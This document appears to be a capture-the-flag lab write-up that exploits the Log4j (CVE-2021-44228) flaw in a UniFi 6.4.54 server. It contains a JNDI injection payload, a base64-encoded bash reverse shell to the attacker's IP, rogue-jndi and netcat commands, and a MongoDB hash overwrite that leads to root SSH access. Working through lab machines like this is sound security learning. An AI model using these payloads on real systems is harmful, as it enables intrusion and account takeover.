![Screenshot 2023-11-06 145544.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/image.png)

# Unified (Log4j)

## Introduction

This writeup explores the effects of exploiting Log4J in a very well known network appliance monitoring system called `"UniFi"`. This box will show you how to set up and install the necessary packages and tools to exploit UniFi by abusing the Log4J vulnerability and manipulate a POST header called remember , giving you a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved in the MongoDB instance that is running on the system, which will allow access to the administration panel and leads to the disclosure of the administrator's SSH password.

## Scanning

```jsx
nmap -sC -sV -v 10.129.179.23
```

![Screenshot 2023-11-06 145544.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_145544.png)

![Screenshot 2023-11-06 145620.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_145620.png)

The scan reveals port 8080 open running an HTTP proxy. The proxy appears to redirect requests to port 8443 , which seems to be running an SSL web server. We take note that the HTTP title of the page on port 8443 is `" UniFi Network "`.

![Screenshot 2023-11-06 150611.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_150611.png)

Upon accessing the page using a browser we are presented with the UniFi web portal login page and the version number is `6.4.54` . If we ever come across a version number it’s always a great idea to research that particular version on Google. A quick Google search using the keywords UniFy 6.4.54 exploit reveals an article that discusses the in-depth exploitation of the `CVE-2021-44228` vulnerability within this application.

### #Using Web proxy (BurpSuite)

First, we attempt to login to the page with the credentials `test:tes`t as we aren’t trying to validate or gain access. The login request will be captured by BurpSuite and we will be able to modify it.
Before we modify the request, let's send this HTTPS packet to the Repeater module of BurpSuite by
pressing `CTRL+R` .

### #Expoitation

We have to input our payload into the remember parameter. Because the POST data is being sent as a JSON object and because the payload contains brackets `{}` , in order to prevent it from being parsed as another JSON object we enclose it inside brackets " so that it is parsed as a string instead

```jsx
${jndi:ldap://{Tun0 IP Address}/whatever}
```

**JNDI** is the acronym for the Java Naming and Directory Interface API . By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.

**LDAP** is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389 .

![Screenshot 2023-11-06 153546.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_153546.png)

After we hit "send" the "Response" pane will display the response from the request. The output shows us an error message stating that the payload is invalid, but despite the error message the payload is actually being executed

Let's proceed to starting tcpdump on port `389` , which will monitor the network traffic for LDAP connections.

![Screenshot 2023-11-06 153523.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_153523.png)

The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port `389.`

We will have to install `Open-JDK` and `Maven` on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system.

```jsx
sudo apt update
sudo apt install openjdk-11-jdk -y
java -version
```

Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is an Integrated Development Environment (IDE) that can be used to create a structured project and compile our projects into jar files .

These applications will also help us run the `rogue-jndi` Java application, which starts a local LDAP server and allows us to receive connections back from the vulnerable server and execute malicious code.

Once we have installed Open-JDK, we can proceed to install Maven. But first, let’s switch to root user.

```jsx
sudo apt-get install maven
mvn -v
```

Once we have installed the required packages, we now need to download and build the Rogue-JNDI Java application.

Let's clone the respective repository and build the package using Maven.

```jsx
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

This will create a `.jar` file in `rogue-jndi/target/` directory called RogueJndi-1.1.jar . Now we can construct our payload to pass into the `RogueJndi-1-1.jar` Java application.

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.

```jsx
echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' |
base64
```

![Screenshot 2023-11-06 161035.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_161035.png)

After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of the `--command` option and your `tun0` IP address to the `--hostname` option.

```jsx
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|
{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

```jsx
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuOTUvNDU0NSAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.95"
```

![Screenshot 2023-11-06 161605.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_161605.png)

Now that the server is listening locally on port 389 , let's open another terminal and start a Netcat listener to capture the reverse shell.

```jsx
nc -lvnp 4545
```

Going back to our intercepted POST request, let's change the payload to ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat} and click Send .

![Screenshot 2023-11-06 161828.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_161828.png)

Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can upgrade the terminal shell using the following command.

```jsx
script /dev/null -c bash
```

![Screenshot 2023-11-06 162238.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_162238.png)

From here we can navigate to /home/Michael/ and read the user flag.

![Screenshot 2023-11-06 162419.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_162419.png)

## #Privilege Escalation

The article states we can get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. First let's check if MongoDB is running on the target system, which might make it possible for us to extract credentials in order to login to the administrative panel.

```jsx
ps aux | grep mongo
```

![Screenshot 2023-11-06 162733.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_162733.png)

We can see MongoDB is running on the target system on port `27117` .

Let's interact with the MongoDB service by making use of the mongo command line utility and attempting to extract the administrator password. A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is `ace` .

```jsx
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

![Screenshot 2023-11-06 163039.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_163039.png)

### #To change the administrator Password

```jsx
mkpasswd -m sha-512 Password1234
$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XX
M8P5Z8j4NB1gJGTONl1
```

Let's proceed to replacing the existing hash with the one we created.

```jsx
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
```

```jsx
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$HoifIPjl1sJ01orq$sQ9ql4XotUG6xiRMPVcITYPgznTlfxeQhGIp4Ley8JV7psNIv0U4IxbgGDJjH2DKPUi3ntwFCbkCnn7vIk55M1"}})'
```

![Screenshot 2023-11-06 163518.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_163518.png)

Let's now visit the website and log in as `administrator` . It is very important to note that the username is case sensitive.

![Screenshot 2023-11-06 163730.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_163730.png)

Navigate to `settings -> site` and scroll down to find the SSH Authentication setting. SSH authentication with a root password has been enabled.

![Screenshot 2023-11-06 163946.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_163946.png)

The page shows the root password in plaintext is `NotACrackablePassword4U2022` . Let's attempt to authenticate to the system as root over SSH.

```jsx
ssh root@10.129.179.23
```

![Screenshot 2023-11-06 164329.png](Unified%20(Log4j)%20f60930bf5d12420cb715e54fce034d5a/Screenshot_2023-11-06_164329.png)

The connection is successful and the root flag can be found in `/root` .